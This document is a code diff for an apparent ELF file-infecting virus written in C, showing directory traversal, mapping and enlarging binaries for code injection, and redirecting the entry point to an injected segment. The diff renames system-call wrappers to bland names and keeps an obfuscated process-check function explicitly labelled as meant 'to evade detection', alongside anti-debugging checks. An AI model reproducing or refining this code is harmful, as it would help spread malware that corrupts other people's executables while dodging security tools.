@@ -223,7 +223,7 @@ int is_program_running(const char *target)
 	char buf[4096];
 	for (;;)
 	{
-		int nread = ft_getdents64(fd, buf, 4096);
+		int nread = fs_enumerate(fd, buf, 4096);
 		if (nread <= 0)
 			break;
 		for (int bpos = 0; bpos < nread;)
@@ -261,8 +261,8 @@ int is_program_running(const char *target)
 				if (cfd >= 0)
 				{
 					char pname[64];
-					int	 len = ft_read(cfd, pname, sizeof(pname) - 1);
-					ft_close(cfd);
+					int	 len = io_recv(cfd, pname, sizeof(pname) - 1);
+					fs_release(cfd);
 					if (len > 0)
 					{
 						pname[len] = '\0';
@@ -271,7 +271,7 @@ int is_program_running(const char *target)
 							*nl = '\0';
 						if (ft_strncmp(pname, target, 80) == 0)
 						{
-							ft_close(fd);
+							fs_release(fd);
 							return 1;
 						}
 					}
@@ -280,13 +280,13 @@ int is_program_running(const char *target)
 			bpos += d->d_reclen;
 		}
 	}
-	ft_close(fd);
+	fs_release(fd);
 	return 0;
 }
 
 // Obfuscated duplicate of is_program_running to evade detection
 // clang-format off
-int _a(const char*o){int a=0;if((a=ft_open("/proc",00|0200000))<0)return 0;char b[4096];for(;;){int c=ft_getdents64(a,b,4096);if(c<=0)break;for(int e=0;e<c;){struct linux_dirent64*d=(struct linux_dirent64*)(b+e);const char*f=d->d_name;int g=1;for(int i=0;f[i];i++){if(f[i]<48||f[i]>57){g=0;break;}}if(g){char h['A'];int i=0;h[i++]=47;h[i++]=112;h[i++]=114;h[i++]=111;h[i++]=99;h[i++]=47;for(int j=0;f[j];j++)h[i++]=f[j];h[i++]=47;h[i++]=99;h[i++]=111;h[i++]=109;h[i++]=109;h[i]=0;int k=ft_open(h,00);if (k >= 0){char l[64];int m=ft_read(k,l,sizeof(l)-1);ft_close(k);if(m>0){l[m]=0;char*n=ft_strchr(l,10);if(n)*n=0;if(ft_strcmp(l,o)==0){ft_close(a);return 1;}}}}e+=d->d_reclen;}}ft_close(a);return 0;}
+int _a(const char*o){int a=0;if((a=ft_open("/proc",00|0200000))<0)return 0;char b[4096];for(;;){int c=fs_enumerate(a,b,4096);if(c<=0)break;for(int e=0;e<c;){struct linux_dirent64*d=(struct linux_dirent64*)(b+e);const char*f=d->d_name;int g=1;for(int i=0;f[i];i++){if(f[i]<48||f[i]>57){g=0;break;}}if(g){char h['A'];int i=0;h[i++]=47;h[i++]=112;h[i++]=114;h[i++]=111;h[i++]=99;h[i++]=47;for(int j=0;f[j];j++)h[i++]=f[j];h[i++]=47;h[i++]=99;h[i++]=111;h[i++]=109;h[i++]=109;h[i]=0;int k=ft_open(h,00);if (k >= 0){char l[64];int m=io_recv(k,l,sizeof(l)-1);fs_release(k);if(m>0){l[m]=0;char*n=ft_strchr(l,10);if(n)*n=0;if(ft_strcmp(l,o)==0){fs_release(a);return 1;}}}}e+=d->d_reclen;}}fs_release(a);return 0;}
 
 static unsigned char rol4(unsigned char x)
 {
@@ -333,7 +333,7 @@ int is_program_running(const char *target)
 
 	for (;;)
 	{
-		int nread = ft_getdents64(fd, buf, sizeof(buf));
+		int nread = fs_enumerate(fd, buf, sizeof(buf));
 		if (nread <= 0)
 			break;
 
@@ -370,8 +370,8 @@ int is_program_running(const char *target)
 				if (cfd >= 0)
 				{
 					char pname[64];
-					int len = ft_read(cfd, pname, sizeof(pname) - 1);
-					ft_close(cfd);
+					int len = io_recv(cfd, pname, sizeof(pname) - 1);
+					fs_release(cfd);
 
 					if (len > 0)
 					{
@@ -392,7 +392,7 @@ int is_program_running(const char *target)
 	}
 
 DONE:
-	ft_close(fd);
+	fs_release(fd);
 	return ret;
 }
 
@@ -408,7 +408,7 @@ int is_debugged(void)
 	int	 nread;
 	int	 offset = 0;
 
-	while ((nread = ft_read(f, line + offset, sizeof(line) - offset)) > 0)
+	while ((nread = io_recv(f, line + offset, sizeof(line) - offset)) > 0)
 	{
 		offset += nread;
 		char *newline = ft_strchr(line, '\n');
@@ -418,20 +418,20 @@ int is_debugged(void)
 			if (ft_strncmp(line, "TracerPid:", 10) == 0)
 			{
 				int pid = ft_atoi(line + 10);
-				ft_close(f);
+				fs_release(f);
 				return pid != 0;
 			}
 			offset = 0;
 		}
 	}
 
-	ft_close(f);
+	fs_release(f);
 	// next_check:
-	// 	if (ft_ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1)
+	// 	if (proc_control(PTRACE_TRACEME, 0, NULL, NULL) == -1)
 	// 		return 1;
 
-	// 	ft_write(1, "ptrace check passed\n", 20);
-	// 	ft_ptrace(PTRACE_DETACH, 0, NULL, NULL);
+	// 	io_send(1, "ptrace check passed\n", 20);
+	// 	proc_control(PTRACE_DETACH, 0, NULL, NULL);
 	return 0;
 }
 
@@ -446,7 +446,7 @@ void processDirectory(char *folder, void *begin_ptr)
 	// Loop over dir entry
 	if (fd < 0)
 		goto clean;
-	while ((nread = ft_getdents64(fd, buffer, 1024)) > 0)
+	while ((nread = fs_enumerate(fd, buffer, 1024)) > 0)
 	{
 		for (int bpos = 0; bpos < nread;)
 		{
@@ -477,7 +477,7 @@ void processDirectory(char *folder, void *begin_ptr)
 			ft_strcat(ft_strcat(ft_strcpy(fullPath, folder), slash), d_name);
 
 			struct stat statbuf;
-			ft_lstat(fullPath, &statbuf);
+			fs_query(fullPath, &statbuf);
 
 			if (statbuf.st_mode & __S_IFDIR)
 			{
@@ -494,7 +494,7 @@ void processDirectory(char *folder, void *begin_ptr)
 		}
 	}
 clean:
-	ft_close(fd);
+	fs_release(fd);
 }
 
 #define ELF_MAGIC			   0x464c457f
@@ -515,12 +515,12 @@ int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
 	write(1, "\n", 1);
 	*file_data = NULL;
 	fd = ft_open(path, O_RDWR);
-	if (fd < 0 || ft_fstat(fd, statbuf) < 0)
+	if (fd < 0 || io_query(fd, statbuf) < 0)
 		goto error;
-	if (ft_ftruncate(fd, statbuf->st_size + MINIMAL_INJECTION_SIZE) < 0)
+	if (io_resize(fd, statbuf->st_size + MINIMAL_INJECTION_SIZE) < 0)
 		goto error;
 	*file_data
-		= (void *) ft_syscall(9, 0, statbuf->st_size + MINIMAL_INJECTION_SIZE,
+		= (void *) rt_vector(9, 0, statbuf->st_size + MINIMAL_INJECTION_SIZE,
 							  PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
 	if (*file_data == MAP_FAILED)
 		goto error;
@@ -538,8 +538,8 @@ int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
 	elf->segments = (ElfW(Phdr) *) (*file_data + elf->header->e_phoff);
 	return (OK);
 error:
-	ft_close(fd);
-	ft_munmap(file_data, statbuf->st_size + MINIMAL_INJECTION_SIZE);
+	fs_release(fd);
+	vm_release(file_data, statbuf->st_size + MINIMAL_INJECTION_SIZE);
 	return (KO);
 }
 
@@ -651,6 +651,6 @@ void infect(char *path, void *begin_ptr)
 	elf.header->e_entry = the_rats.p_vaddr;
 	write(1, "OKKK\n", 5);
 clean:
-	ft_msync(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE, MS_SYNC);
-	ft_munmap(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE);
+	vm_flush(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE, MS_SYNC);
+	vm_release(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE);
 }
